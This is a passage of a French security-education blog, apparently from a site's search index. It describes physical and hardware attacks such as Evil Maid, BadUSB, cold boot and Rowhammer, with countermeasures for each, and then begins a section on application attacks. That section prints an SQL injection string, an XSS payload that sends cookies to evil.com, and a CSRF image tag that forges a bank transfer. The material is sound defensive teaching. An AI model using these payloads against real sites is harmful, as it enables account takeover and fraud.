‚úÖ Gestion de flotte (MDM) Capacit√© de verrouiller ou effacer un appareil √† distance. Pourquoi √ßa prot√®ge : limite l‚Äôimpact d‚Äôun vol. 2. Evil Maid Attack (attaque ‚Äúfemme de m√©nage‚Äù) 1. Situation de d√©part Un voyageur laisse son laptop dans une chambre d‚Äôh√¥tel.\n2. Ce que fait l‚Äôattaquant Il d√©marre la machine avec une cl√© USB bootable. Il installe un bootkit ou modifie le chargeur de d√©marrage. 3. Cons√©quence Persistance au d√©marrage (keylogger avant OS). Vol des credentials au prochain login. 4. Pourquoi c‚Äôest possible Boot non prot√©g√©. Pas de Secure Boot ni mot de passe BIOS/UEFI. 5. Contre-mesures ‚úÖ Secure Boot + mot de passe BIOS/UEFI Emp√™che le boot depuis un m√©dia externe non autoris√©. Pourquoi √ßa prot√®ge : l‚Äôattaquant ne peut pas charger son bootkit. ‚úÖ TPM + chiffrement disque Stocke et v√©rifie l‚Äôint√©grit√© du bootloader. Pourquoi √ßa prot√®ge : toute modification d√©clenche une alerte ou emp√™che le d√©chiffrement. ‚úÖ Transport s√©curis√© Garder le laptop avec soi, cadenas pour portables. Pourquoi √ßa prot√®ge : r√©duit le risque d‚Äôacc√®s physique furtif. 3. Attaques par ports physiques (USB, FireWire, Thunderbolt) 1. Situation de d√©part Un employ√© branche une cl√© USB inconnue trouv√©e dans le parking de l‚Äôentreprise.\n2. Ce que fait l‚Äôattaquant La cl√© contient un firmware malveillant (Rubber Ducky, BadUSB). √Ä la connexion, elle se pr√©sente comme un clavier et envoie des commandes rapides. 3. Cons√©quence Ex√©cution de commandes (ex. cr√©er un compte admin). D√©ploiement de malwares. 4. Pourquoi c‚Äôest possible Les ports physiques font confiance aux p√©riph√©riques branch√©s. Pas de contr√¥le ou de politique sur les p√©riph√©riques USB. 5. Contre-mesures ‚úÖ D√©sactivation des ports inutiles Bloquer USB pour tout sauf les p√©riph√©riques autoris√©s. Pourquoi √ßa prot√®ge : emp√™che un p√©riph√©rique inconnu de s‚Äôex√©cuter. ‚úÖ USB whitelisting Autoriser uniquement les p√©riph√©riques connus via leur ID. Pourquoi √ßa prot√®ge : une cl√© pirate n‚Äôest pas reconnue. ‚úÖ Sensibilisation utilisateurs Expliquer que brancher une cl√© inconnue est dangereux. Pourquoi √ßa prot√®ge : r√©duit l‚Äôerreur humaine. 4. Attaques par canaux auxiliaires (Side-Channel) 1. Situation de d√©part Un attaquant a un acc√®s physique ou proche d‚Äôune machine.\n2. Ce que fait l‚Äôattaquant Exploite les √©missions √©lectromagn√©tiques, la consommation √©lectrique ou le temps d‚Äôex√©cution. D√©duit des cl√©s cryptographiques ou informations sensibles. 3. Cons√©quence Vol de cl√©s priv√©es. Compromission de syst√®mes s√©curis√©s (cartes √† puce, TPM). 4. Pourquoi c‚Äôest possible Les composants physiques √©mettent toujours des signaux mesurables. Pas de contre-mesure mat√©rielle en place. 5. Contre-mesures ‚úÖ Blindage mat√©riel Coques anti-EM, chambres de Faraday. Pourquoi √ßa prot√®ge : bloque la fuite √©lectromagn√©tique. ‚úÖ Algorithmes r√©sistants aux side-channels Ajouter du bruit, randomiser les op√©rations cryptographiques. Pourquoi √ßa prot√®ge : rend l‚Äôanalyse des signaux inutile. ‚úÖ Monitoring d‚Äôanomalies mat√©rielles Surveiller les variations inhabituelles de consommation. Pourquoi √ßa prot√®ge : alerte sur une tentative de side-channel. 5. Attaques RFID / Badges 1. Situation de d√©part L‚Äôentreprise utilise des badges RFID pour contr√¥ler l‚Äôacc√®s physique.\n2. Ce que fait l‚Äôattaquant Il approche un lecteur portable du badge d‚Äôun employ√© (ex. dans le m√©tro). Il copie l‚Äôidentifiant RFID. Il clone le badge et acc√®de aux locaux. 3. Cons√©quence Intrusion physique dans les b√¢timents. Vol de mat√©riel ou acc√®s aux serveurs. 4. Pourquoi c‚Äôest possible Les badges RFID basiques ne sont pas chiffr√©s. L‚Äôauthentification repose sur un simple identifiant. 5. Contre-mesures ‚úÖ Badges cryptographiques (MIFARE DESFire, iCLASS SE) Les √©changes sont chiffr√©s. Pourquoi √ßa prot√®ge : impossible de cloner un badge sans la cl√© secr√®te. ‚úÖ Multi-factor physique Badge + code PIN ou empreinte. Pourquoi √ßa prot√®ge : le clonage seul ne suffit pas. ‚úÖ D√©tection d‚Äôacc√®s suspects Alerter si un badge utilis√© simultan√©ment en deux endroits. Pourquoi √ßa prot√®ge : permet de rep√©rer un badge clon√©. 6. Cold Boot Attack 1. Situation de d√©part Un laptop est en veille avec la session ouverte.\n2. Ce que fait l‚Äôattaquant Il red√©marre brutalement la machine avec une cl√© USB sp√©ciale. La RAM, encore charg√©e, contient des cl√©s de chiffrement. Il extrait ces cl√©s pour d√©chiffrer le disque. 3. Cons√©quence Contournement du chiffrement disque. Acc√®s aux fichiers prot√©g√©s. 4. Pourquoi c‚Äôest possible La m√©moire vive conserve les donn√©es quelques secondes apr√®s extinction. Pas de protection contre ce type d‚Äôattaque. 5. Contre-mesures ‚úÖ Forcer l‚Äôarr√™t complet Toujours √©teindre, pas juste mettre en veille. Pourquoi √ßa prot√®ge : supprime les cl√©s de la RAM. ‚úÖ TPM + chiffrement avec cl√© mat√©rielle Cl√©s stock√©es dans le TPM, pas en RAM. Pourquoi √ßa prot√®ge : m√™me en dumpant la RAM, pas de cl√© disponible. ‚úÖ Remplissage m√©moire au shutdown √âcraser la RAM avant extinction. Pourquoi √ßa prot√®ge : √©vite la persistance des cl√©s. 7. Supply Chain mat√©rielle 1. Situation de d√©part Une entreprise ach√®te des serveurs ou composants r√©seau aupr√®s d‚Äôun fournisseur tiers.\n2. Ce que fait l‚Äôattaquant Il ins√®re un micro-contr√¥leur espion dans une carte m√®re, un routeur ou un disque dur. Le composant malveillant transmet des donn√©es √† distance ou ouvre une backdoor mat√©rielle. 3. Cons√©quence Espionnage furtif de tout le trafic r√©seau. Persistance difficile √† d√©tecter m√™me apr√®s r√©installation logicielle. 4. Pourquoi c‚Äôest possible Confiance aveugle dans la cha√Æne d‚Äôapprovisionnement. Composants complexes et opaques (firmwares propri√©taires). 5. Contre-mesures ‚úÖ Sourcing v√©rifi√© Acheter aupr√®s de fournisseurs certifi√©s et audit√©s. Pourquoi √ßa prot√®ge : r√©duit les risques d‚Äôintroduire un composant compromis. ‚úÖ V√©rification mat√©rielle Contr√¥ler les circuits imprim√©s, scanner les firmwares. Pourquoi √ßa prot√®ge : permet de d√©tecter des composants ajout√©s. ‚úÖ Diversification Ne pas d√©pendre d‚Äôun seul fournisseur critique. Pourquoi √ßa prot√®ge : limite l‚Äôimpact d‚Äôune compromission. 8. Implants mat√©riels (hardware implants) 1. Situation de d√©part Un attaquant a un acc√®s physique temporaire √† un serveur.\n2. Ce que fait l‚Äôattaquant Il ajoute un petit module espion branch√© sur un port PCIe, USB ou directement soud√© sur la carte m√®re. L‚Äôimplant intercepte les communications (ex. keylogger hardware, sniff r√©seau). 3. Cons√©quence Espionnage silencieux et durable. Difficult√© de d√©tection (le composant semble l√©gitime). 4. Pourquoi c‚Äôest possible Les machines ne sont pas inspect√©es physiquement apr√®s installation. Les firmwares ne sont pas audit√©s. 5. Contre-mesures ‚úÖ Scell√©s de s√©curit√© Ajouter des scell√©s inviolables sur les bo√Ætiers. Pourquoi √ßa prot√®ge : permet de d√©tecter toute ouverture non autoris√©e. ‚úÖ Inventaire mat√©riel Lister tous les p√©riph√©riques d√©tect√©s par le BIOS/UEFI. Pourquoi √ßa prot√®ge : rep√®re l‚Äôajout d‚Äôun composant inconnu. ‚úÖ Zones s√©curis√©es Restreindre l‚Äôacc√®s physique aux serveurs critiques. Pourquoi √ßa prot√®ge : r√©duit la possibilit√© d‚Äôimplanter un module espion. 9. Attaques CPU ‚Äì Spectre \u0026amp; Meltdown 1. Situation de d√©part Un serveur multi-utilisateurs partage un CPU moderne (Intel, AMD).\n2. Ce que fait l‚Äôattaquant Il exploite l‚Äôex√©cution sp√©culative du processeur. En mesurant les temps d‚Äôacc√®s m√©moire, il r√©cup√®re des donn√©es appartenant √† d‚Äôautres processus. 3. Cons√©quence Vol de cl√©s cryptographiques, mots de passe. Compromission inter-VM sur un m√™me h√¥te cloud. 4. Pourquoi c‚Äôest possible Les processeurs modernes optimisent les performances avec l‚Äôex√©cution sp√©culative. Mais ces optimisations laissent fuiter des informations par effet de cache. 5. Contre-mesures ‚úÖ Patches microcode et kernel Correctifs limitant ou d√©sactivant certaines optimisations CPU. Pourquoi √ßa prot√®ge : ferme les canaux d‚Äôinformation cach√©s. ‚úÖ Isolation des workloads sensibles Ex√©cuter les processus critiques sur des machines d√©di√©es. Pourquoi √ßa prot√®ge : emp√™che un attaquant de cohabiter sur le m√™me CPU. ‚úÖ Techniques de mitigation logicielle Insertion de barri√®res m√©moire dans le code sensible. Pourquoi √ßa prot√®ge : emp√™che l‚Äôexploitation du cache. 10. DMA Attacks (Direct Memory Access) 1. Situation de d√©part Un laptop est √©quip√© de ports Thunderbolt/FireWire permettant un acc√®s direct √† la m√©moire.\n2. Ce que fait l‚Äôattaquant Il branche un p√©riph√©rique malveillant (ex. Thunderclap). Celui-ci lit directement la m√©moire RAM via DMA. 3. Cons√©quence Vol de cl√©s cryptographiques, mots de passe. Contournement du syst√®me d‚Äôexploitation. 4. Pourquoi c‚Äôest possible DMA permet un acc√®s rapide √† la m√©moire sans contr√¥le. Les p√©riph√©riques branch√©s sont implicitement ‚Äúdignes de confiance‚Äù. 5. Contre-mesures ‚úÖ IOMMU (Input-Output Memory Management Unit) Contr√¥le les acc√®s m√©moire des p√©riph√©riques. Pourquoi √ßa prot√®ge : emp√™che un p√©riph√©rique d‚Äôacc√©der √† des zones m√©moire non autoris√©es. ‚úÖ D√©sactivation des ports sensibles Bloquer Thunderbolt/FireWire si inutiles. Pourquoi √ßa prot√®ge : supprime le vecteur d‚Äôattaque. ‚úÖ Authentification p√©riph√©rique Thunderbolt 3+ inclut un mode de s√©curit√© avec autorisation explicite. Pourquoi √ßa prot√®ge : emp√™che un p√©riph√©rique inconnu d‚Äôacc√©der √† la m√©moire. 11. Attaques sur les cartes r√©seau (NIC attacks) 1. Situation de d√©part Un serveur utilise une carte r√©seau intelligente (NIC avec firmware).\n2. Ce que fait l‚Äôattaquant Il compromet le firmware de la carte r√©seau. La carte intercepte, modifie ou redirige le trafic. 3. Cons√©quence MITM permanent au niveau mat√©riel. Invisible pour le syst√®me d‚Äôexploitation. 4. Pourquoi c‚Äôest possible Les firmwares r√©seau sont rarement v√©rifi√©s ou mis √† jour. Peu de visibilit√© sur ce qui s‚Äôex√©cute dans la NIC. 5. Contre-mesures ‚úÖ Mise √† jour des firmwares Installer r√©guli√®rement les patchs du constructeur. Pourquoi √ßa prot√®ge : corrige les failles connues. ‚úÖ Secure Boot mat√©riel pour NIC V√©rifier la signature du firmware avant ex√©cution. Pourquoi √ßa prot√®ge : emp√™che le chargement d‚Äôun firmware modifi√©. ‚úÖ Segmentation physique D√©di√© une carte r√©seau aux flux sensibles. Pourquoi √ßa prot√®ge : r√©duit l‚Äôimpact d‚Äôune carte compromise. 12. Evil Peripheral (implants dans p√©riph√©riques) 1. Situation de d√©part Une entreprise re√ßoit une cl√© USB ‚Äúcadeau‚Äù ou un clavier offert lors d‚Äôun salon.\n2. Ce que fait l‚Äôattaquant Le p√©riph√©rique contient un microcontr√¥leur espion. Exemple : clavier qui enregistre toutes les frappes et les envoie en Wi-Fi. 3. Cons√©quence Espionnage discret et permanent. Vol de donn√©es sensibles. 4. Pourquoi c‚Äôest possible Les p√©riph√©riques USB sont de v√©ritables mini-ordinateurs. Le syst√®me fait confiance aux p√©riph√©riques branch√©s. 5. Contre-mesures ‚úÖ Achat uniquement aupr√®s de sources fiables Ne jamais accepter de p√©riph√©rique inconnu. Pourquoi √ßa prot√®ge : r√©duit le risque d‚Äôintroduire du mat√©riel pi√©g√©. ‚úÖ USB whitelisting Autoriser uniquement les p√©riph√©riques connus et valid√©s. Pourquoi √ßa prot√®ge : un p√©riph√©rique espion n‚Äôest pas reconnu. ‚úÖ Audit mat√©riel D√©monter et inspecter p√©riodiquement les p√©riph√©riques critiques. Pourquoi √ßa prot√®ge : permet d‚Äôidentifier un implant physique cach√©. 13. Rowhammer 1. Situation de d√©part Un attaquant ex√©cute du code sur une machine (local ou VM).\nIl n‚Äôa pas les droits admin mais peut manipuler la m√©moire (RAM).\n2. Ce que fait l‚Äôattaquant Il acc√®de de fa√ßon r√©p√©t√©e √† certaines cellules m√©moire (‚Äúmartelage‚Äù de lignes adjacentes). Ce stress √©lectrique provoque des inversions de bits dans les cellules voisines. 3. Cons√©quence Modification de la m√©moire sans droits. Possibilit√© d‚Äô√©lever ses privil√®ges (ex. changer un bit dans une structure critique). 4. Pourquoi c‚Äôest possible La RAM DRAM est sensible aux interf√©rences √©lectriques entre cellules. Pas de protection mat√©rielle par d√©faut. 5. Contre-mesures ‚úÖ ECC RAM (Error-Correcting Code) Corrige les erreurs m√©moire √† la vol√©e. Pourquoi √ßa prot√®ge : r√©duit la probabilit√© d‚Äôexploitation. ‚úÖ Randomisation d‚Äôallocation m√©moire D√©placer les donn√©es critiques dans la m√©moire. Pourquoi √ßa prot√®ge : rend difficile de cibler une cellule pr√©cise. ‚úÖ Rafra√Æchissement m√©moire (TRR ‚Äì Target Row Refresh) Certains constructeurs ajoutent un m√©canisme de protection DRAM. Pourquoi √ßa prot√®ge : d√©tecte le martelage et rafra√Æchit les lignes affect√©es. 14. Foreshadow (L1 Terminal Fault) 1. Situation de d√©part Un attaquant ex√©cute du code sur une machine avec processeur Intel.\n2. Ce que fait l‚Äôattaquant Il exploite une faille dans la gestion du cache L1. Il peut lire des donn√©es prot√©g√©es (m√™me dans SGX enclaves ou VM). 3. Cons√©quence Vol de cl√©s cryptographiques. Fuite d‚Äôinformations entre VM sur cloud partag√©. 4. Pourquoi c‚Äôest possible Mauvaise isolation entre le cache CPU et la m√©moire prot√©g√©e. Vuln√©rabilit√© dans l‚Äôarchitecture Intel. 5. Contre-mesures ‚úÖ Microcode updates Patches fournis par Intel pour corriger la gestion du cache. Pourquoi √ßa prot√®ge : ferme la faille au niveau du CPU. ‚úÖ D√©sactivation SGX (si inutile) Ne pas activer les enclaves si elles ne sont pas utilis√©es. Pourquoi √ßa prot√®ge : r√©duit la surface d‚Äôattaque. ‚úÖ Isolation stricte en cloud Ne pas coh√©berger des workloads sensibles avec d‚Äôautres clients. Pourquoi √ßa prot√®ge : emp√™che la fuite inter-VM. 15. ZombieLoad (et autres MDS ‚Äì Microarchitectural Data Sampling) 1. Situation de d√©part Un attaquant a acc√®s √† un serveur partag√©.\nIl n‚Äôest pas admin mais peut ex√©cuter du code.\n2. Ce que fait l‚Äôattaquant Il exploite des fuites dans les buffers internes du CPU (MDS). Il r√©cup√®re des donn√©es utilis√©es r√©cemment par d‚Äôautres processus. 3. Cons√©quence Vol de donn√©es sensibles (cl√©s, requ√™tes, mots de passe). Fuite inter-processus ou inter-VM. 4. Pourquoi c‚Äôest possible Les processeurs utilisent des buffers internes (fill buffers, load ports). Pas de cloisonnement parfait entre processus. 5. Contre-mesures ‚úÖ Patches microcode + kernel D√©sactivation partielle de certaines optimisations CPU. Pourquoi √ßa prot√®ge : supprime les fuites par buffers internes. ‚úÖ HT (Hyper-Threading) d√©sactiv√© Isoler les threads physiques. Pourquoi √ßa prot√®ge : r√©duit la fuite entre deux threads partageant le m√™me c≈ìur. ‚úÖ Workload isolation D√©ployer les t√¢ches sensibles sur des serveurs d√©di√©s. Pourquoi √ßa prot√®ge : √©vite les attaques cross-tenant en cloud. 16. Attaques Cold Boot avanc√©es 1. Situation de d√©part Un laptop ou serveur est red√©marr√© brutalement alors qu‚Äôil est encore allum√©.\n2. Ce que fait l‚Äôattaquant Il refroidit la RAM avec de l‚Äôair comprim√© invers√© ou de l‚Äôazote liquide. Cela ralentit la perte des donn√©es en m√©moire. Il extrait les cl√©s de chiffrement disque stock√©es en RAM. 3. Cons√©quence Contournement du chiffrement complet du disque. Acc√®s aux fichiers prot√©g√©s. 4. Pourquoi c‚Äôest possible La m√©moire volatile ne s‚Äôefface pas instantan√©ment √† l‚Äôarr√™t. Les cl√©s sont souvent stock√©es en RAM lors d‚Äôune session active. 5. Contre-mesures ‚úÖ Forcer effacement RAM √âcraser la m√©moire au shutdown. Pourquoi √ßa prot√®ge : supprime les cl√©s avant extinction compl√®te. ‚úÖ TPM + Secure Boot Stocker les cl√©s dans TPM plut√¥t qu‚Äôen RAM. Pourquoi √ßa prot√®ge : √©vite que les cl√©s critiques soient r√©cup√©rables. ‚úÖ √âteindre compl√®tement (pas veille) Ne jamais laisser une machine sensible en veille/hibernation. Pourquoi √ßa prot√®ge : supprime les donn√©es sensibles de la RAM. 17. Attaques physiques sur GPU (extraction via VRAM) 1. Situation de d√©part Une machine utilise un GPU pour acc√©l√©rer les calculs (IA, chiffrement, crypto mining).\n2. Ce que fait l‚Äôattaquant Il exploite le fait que la m√©moire VRAM garde temporairement des donn√©es. Il lit directement la VRAM pour extraire mod√®les, cl√©s ou donn√©es trait√©es. 3. Cons√©quence Vol de donn√©es sensibles (weights IA, images trait√©es, cl√©s). Espionnage d‚Äôapplications graphiques ou de calcul scientifique. 4. Pourquoi c‚Äôest possible La VRAM n‚Äôest pas toujours effac√©e correctement apr√®s usage. Peu de contr√¥les d‚Äôacc√®s sur certaines architectures GPU. 5. Contre-mesures ‚úÖ Effacement m√©moire GPU Nettoyer la VRAM apr√®s chaque job. Pourquoi √ßa prot√®ge : √©vite la r√©cup√©ration de donn√©es r√©siduelles. ‚úÖ Isolation des workloads GPU Pas de partage GPU entre tenants sensibles. Pourquoi √ßa prot√®ge : emp√™che les fuites inter-clients en cloud GPU. ‚úÖ Drivers s√©curis√©s Installer les derni√®res mises √† jour GPU. Pourquoi √ßa prot√®ge : corrige les vuln√©rabilit√©s d‚Äôacc√®s m√©moire. 18. Fault Injection (Glitching) 1. Situation de d√©part Un attaquant cible un √©quipement mat√©riel (carte bancaire, IoT, puce embarqu√©e).\n2. Ce que fait l‚Äôattaquant Il provoque volontairement une erreur physique (glitch). Techniques : impulsion laser, surtension, variation rapide de l‚Äôhorloge. Objectif : perturber l‚Äôex√©cution du processeur pour contourner un contr√¥le (ex. bypass d‚Äôun PIN). 3. Cons√©quence Contournement d‚Äôauthentification mat√©rielle. Extraction de secrets stock√©s dans une puce s√©curis√©e. 4. Pourquoi c‚Äôest possible Les circuits √©lectroniques ne g√®rent pas toujours les perturbations √©lectriques extr√™mes. Pas de protections contre les fautes physiques. 5. Contre-mesures ‚úÖ Capteurs anti-tamper D√©tectent anomalies √©lectriques, laser, temp√©rature. Pourquoi √ßa prot√®ge : bloque ou efface les donn√©es si une attaque est d√©tect√©e. ‚úÖ Redondance d‚Äôex√©cution R√©p√©ter les op√©rations sensibles et comparer les r√©sultats. Pourquoi √ßa prot√®ge : un glitch isol√© est d√©tect√© par incoh√©rence. ‚úÖ Blindage physique Ajouter un packaging anti-intrusion autour de la puce. Pourquoi √ßa prot√®ge : rend l‚Äôacc√®s mat√©riel direct plus difficile. 19. RAMBleed (exploitation m√©moire type Rowhammer √©tendu) 1. Situation de d√©part Un attaquant ex√©cute du code sur une machine partag√©e (ex. cloud).\n2. Ce que fait l‚Äôattaquant Il utilise une variante de Rowhammer :\nau lieu de modifier des bits, il observe les fuites d‚Äôinformation induites par les inversions de bits voisines. Cela lui permet de lire des donn√©es sensibles en m√©moire. 3. Cons√©quence Vol de cl√©s cryptographiques d‚Äôun autre processus. Espionnage inter-VM en cloud. 4. Pourquoi c‚Äôest possible DRAM vuln√©rable aux interf√©rences √©lectromagn√©tiques. ECC RAM corrige mais ne masque pas toujours la fuite d‚Äôinformation. 5. Contre-mesures ‚úÖ DRAM r√©sistante (DDR4+ avec TRR) Protection int√©gr√©e contre Rowhammer/RAMBleed. Pourquoi √ßa prot√®ge : emp√™che le martelage cibl√©. ‚úÖ Isolation forte en cloud Ne pas coh√©berger des workloads critiques avec d‚Äôautres clients. Pourquoi √ßa prot√®ge : limite les fuites inter-tenant. ‚úÖ Monitoring m√©moire D√©tecter acc√®s r√©p√©titifs suspects aux m√™mes lignes. Pourquoi √ßa prot√®ge : alerte sur une tentative Rowhammer/RAMBleed. 20. Pre-compromised BIOS/UEFI (supply chain firmware) 1. Situation de d√©part Une entreprise ach√®te des serveurs pr√©configur√©s.\n2. Ce que fait l‚Äôattaquant Le BIOS/UEFI livr√© contient d√©j√† un rootkit cach√©. D√®s le premier boot, l‚Äôattaquant contr√¥le la machine. 3. Cons√©quence Persistance ind√©tectable m√™me apr√®s r√©installation OS. Espionnage ou d√©tournement permanent. 4. Pourquoi c‚Äôest possible Firmware ferm√©, peu audit√©. Confiance aveugle dans le constructeur ou le revendeur. 5. Contre-mesures ‚úÖ V√©rification de l‚Äôempreinte firmware Comparer le hash du BIOS/UEFI avec la version constructeur. Pourquoi √ßa prot√®ge : d√©tecte toute modification malveillante. ‚úÖ Secure Boot + TPM Emp√™che le boot si le firmware n‚Äôest pas sign√©. Pourquoi √ßa prot√®ge : bloque l‚Äôex√©cution d‚Äôun BIOS compromis. ‚úÖ Approvisionnement s√©curis√© Travailler uniquement avec des constructeurs certifi√©s. Pourquoi √ßa prot√®ge : r√©duit le risque de recevoir un mat√©riel alt√©r√©. 21. Attaques sur bus mat√©riels (PCIe, I¬≤C, SPI) 1. Situation de d√©part Un attaquant a un acc√®s physique temporaire √† une machine.\n2. Ce que fait l‚Äôattaquant Il branche un sniffer sur un bus interne (PCIe, I¬≤C, SPI). Il capture les communications entre CPU et p√©riph√©riques. Exemple : r√©cup√©ration de cl√©s √©chang√©es entre CPU et TPM. 3. Cons√©quence Vol de donn√©es sensibles en transit interne. Injection de commandes malveillantes dans les p√©riph√©riques. 4. Pourquoi c‚Äôest possible Les bus mat√©riels ne sont pas chiffr√©s. L‚Äôarchitecture suppose un environnement ‚Äúde confiance‚Äù. 5. Contre-mesures ‚úÖ Chiffrement interne (bus encryption) Certains processeurs modernes chiffrent les communications sur le bus. Pourquoi √ßa prot√®ge : emp√™che la lecture directe des √©changes. ‚úÖ Blindage physique Difficult√© d‚Äôacc√®s aux bus (scell√©s, bo√Ætiers renforc√©s). Pourquoi √ßa prot√®ge : complique l‚Äôinstallation d‚Äôun sniffer. ‚úÖ Monitoring mat√©riel D√©tecter des p√©riph√©riques PCIe inconnus. Pourquoi √ßa prot√®ge : alerte sur un implant espion branch√© en interne. 22. Side-channels via consommation d‚Äô√©nergie (Power Analysis) 1. Situation de d√©part Un attaquant cible une carte √† puce (paiement, HSM).\n2. Ce que fait l‚Äôattaquant Il mesure la consommation √©lectrique de la puce lors d‚Äôop√©rations cryptographiques. Il corr√®le les variations de consommation avec les bits calcul√©s. 3. Cons√©quence Extraction de cl√©s priv√©es (RSA, AES). Compromission de syst√®mes suppos√©s inviolables. 4. Pourquoi c‚Äôest possible Les calculs cryptographiques consomment plus ou moins d‚Äô√©nergie selon les bits manipul√©s. Pas de contre-mesure mat√©rielle. 5. Contre-mesures ‚úÖ Algorithmes masqu√©s (masking) Ajouter du bruit al√©atoire dans les calculs. Pourquoi √ßa prot√®ge : rend la corr√©lation consommation/cl√© inutilisable. ‚úÖ Blindage alimentation Ajouter des filtres et r√©gulateurs. Pourquoi √ßa prot√®ge : aplanit les variations de consommation. ‚úÖ D√©tection d‚Äôintrusion Capteurs qui arr√™tent la puce si une sonde √©lectrique est branch√©e. Pourquoi √ßa prot√®ge : emp√™che l‚Äôattaquant de mesurer la consommation. Conclusion Les attaques physiques rappellent que la cybers√©curit√© n‚Äôest pas qu‚Äôun probl√®me logiciel :\nun attaquant motiv√© peut exploiter le contact direct avec le mat√©riel ou d√©tourner les comportements naturels des composants.\nTrois grands principes de d√©fense ressortent :\nDurcissement physique ‚Üí chiffrement disque, scell√©s de s√©curit√©, blindage, TPM, Secure Boot. Gestion op√©rationnelle ‚Üí proc√©dures de destruction des d√©chets, contr√¥le des acc√®s physiques, politique stricte sur les p√©riph√©riques. Surveillance avanc√©e ‚Üí monitoring mat√©riel, audits de firmware, d√©tection d‚Äôanomalies √©lectromagn√©tiques ou de consommation. En r√©sum√©, la protection mat√©rielle exige de traiter les √©quipements comme des actifs critiques, au m√™me titre que les applications et les donn√©es : s√©curiser le logiciel ne suffit pas si le mat√©riel peut √™tre compromis.\n","permalink":"http://localhost:1313/blog/attaques-physiques-materielles/","summary":"Les attaques physiques et mat√©rielles exploitent l‚Äôacc√®s direct aux √©quipements ou les propri√©t√©s des composants (laptops, processeurs, bus internes, badges RFID). D√©couvrez leurs techniques (Evil Maid, Cold Boot, implants mat√©riels, side-channels) et les contre-mesures pour renforcer la s√©curit√©.","title":"üí™ Attaques physiques et mat√©rielles"},{"content":"Attaques Applicatives Les attaques applicatives ciblent directement les programmes (sites web, API, logiciels).\nElles exploitent des erreurs de d√©veloppement ou de configuration pour d√©tourner la logique, ex√©cuter du code ou acc√©der √† des donn√©es sensibles.\nContrairement aux attaques r√©seau, qui visent le transport des donn√©es, ou aux attaques syst√®mes, qui visent l‚ÄôOS et l‚Äôinfrastructure, les attaques applicatives s‚Äôappuient sur les failles laiss√©es dans le code m√©tier ou les frameworks utilis√©s.\nElles incluent :\nles injections (SQL, commande, XXE, d√©s√©rialisation), les attaques c√¥t√© client (XSS, CSRF), les abus de logique m√©tier (IDOR, Mass Assignment, flaws business), l‚Äôexploitation de failles techniques (buffer overflow, RCE, path traversal), et les abus sp√©cifiques aux technologies modernes (GraphQL, JWT, SSRF, API abuse). Ces attaques sont redoutables car elles exploitent des comportements ‚Äúnormaux‚Äù de l‚Äôapplication en y ins√©rant des entr√©es malveillantes. Souvent, elles passent inaper√ßues si la validation des entr√©es, la gestion des sessions et les contr√¥les d‚Äôacc√®s ne sont pas rigoureusement appliqu√©s.\n1. Injection SQL (SQLi) 1. Situation de d√©part Une application web propose un formulaire de connexion.\nLe code construit une requ√™te SQL √† partir des donn√©es saisies sans filtrage.\n2. Ce que fait l‚Äôattaquant Il saisit dans le champ username une valeur sp√©ciale :\n' OR '1'='1\nLa requ√™te devient toujours vraie et retourne tous les utilisateurs.\n3. Cons√©quence Contournement d‚Äôauthentification. Extraction ou modification de donn√©es sensibles. Destruction de tables si l‚Äôattaquant injecte un DROP TABLE. 4. Pourquoi c‚Äôest possible Les entr√©es utilisateur sont directement ins√©r√©es dans la requ√™te SQL. Pas de s√©paration entre code SQL et donn√©es. 5. Contre-mesures ‚úÖ Requ√™tes pr√©par√©es (param√©tr√©es) Comment √ßa marche : la requ√™te SQL est compil√©e avec des ‚Äúplaceholders‚Äù (? ou :param). Les donn√©es sont envoy√©es s√©par√©ment. Pourquoi √ßa prot√®ge : m√™me si l‚Äôutilisateur entre du SQL malveillant, il est trait√© comme une simple donn√©e, pas comme du code. ‚úÖ ORM ou Query Builder fiable Comment √ßa marche : g√©n√®re les requ√™tes en s√©parant toujours les donn√©es des instructions. Pourquoi √ßa prot√®ge : r√©duit le risque de concat√©nation dangereuse. ‚úÖ Validation et √©chapper les entr√©es V√©rifier les types attendus (ex. un id doit √™tre un entier). √âchapper les caract√®res sp√©ciaux. Pourquoi √ßa prot√®ge : limite les possibilit√©s d‚Äôinjection non pr√©vues. 2. Cross-Site Scripting (XSS) 1. Situation de d√©part Une application affiche des commentaires d‚Äôutilisateurs sans filtrage.\n2. Ce que fait l‚Äôattaquant Il poste un commentaire :\n\u0026lt;script\u0026gt;document.location='http://evil.com/steal?c='+document.cookie\u0026lt;/script\u0026gt;\n3. Cons√©quence Le navigateur des victimes ex√©cute le script. Vol de cookies/session. Redirection vers des pages malveillantes. 4. Pourquoi c‚Äôest possible Le navigateur n‚Äôa aucun moyen de savoir si un script affich√© vient du site ou d‚Äôun utilisateur malveillant. L‚Äôapplication ne filtre pas ou n‚Äô√©chappe pas les entr√©es. 5. Contre-mesures ‚úÖ √âchappement du HTML (Output Encoding) Comment √ßa marche : transformer \u0026lt; en \u0026amp;lt;, \u0026gt; en \u0026amp;gt;, etc. Pourquoi √ßa prot√®ge : le navigateur n‚Äôex√©cute pas du code mais affiche du texte inoffensif. ‚úÖ CSP (Content Security Policy) Comment √ßa marche : indique au navigateur quelles sources de scripts sont autoris√©es (script-src 'self'). Pourquoi √ßa prot√®ge : m√™me si un script inject√© appara√Æt, le navigateur le bloque. ‚úÖ HttpOnly sur les cookies Comment √ßa marche : flag HttpOnly emp√™che JavaScript d‚Äôacc√©der aux cookies. Pourquoi √ßa prot√®ge : r√©duit l‚Äôimpact d‚Äôun XSS sur le vol de session. 3. Cross-Site Request Forgery (CSRF) 1. Situation de d√©part Un utilisateur est connect√© √† son compte bancaire sur banque.fr.\nLe site permet un virement via une requ√™te POST.\n2. Ce que fait l‚Äôattaquant Il envoie un mail pi√©g√© contenant :\n\u0026lt;img src=\u0026quot;https://banque.fr/virement?montant=1000\u0026amp;vers=compteAttaquant\u0026quot;\u0026gt;\n3. Cons√©quence Le navigateur de la victime envoie la requ√™te avec son cookie de session. La banque ex√©cute le virement comme si c‚Äô√©tait la victime. 4. Pourquoi c‚Äôest possible Les navigateurs ajoutent automatiquement les cookies aux requ√™tes. Le site ne v√©rifie pas si la requ√™te a vraiment √©t√© initi√©e par l‚Äôutilisateur. 5. Contre-mesures ‚úÖ Jetons CSRF (anti-CSRF tokens) Comment √ßa marche : chaque formulaire contient un token al√©atoire unique stock√© en session. Pourquoi √ßa prot√®ge : l‚Äôattaquant ne peut pas deviner ce token ‚Üí sa requ√™te est rejet√©e. ‚úÖ SameSite cookies Comment √ßa marche : flag SameSite=Lax ou Strict sur les cookies emp√™che leur envoi depuis un site externe. Pourquoi √ßa prot√®ge : les requ√™tes forg√©es depuis evil.com ne transportent pas le cookie de session. 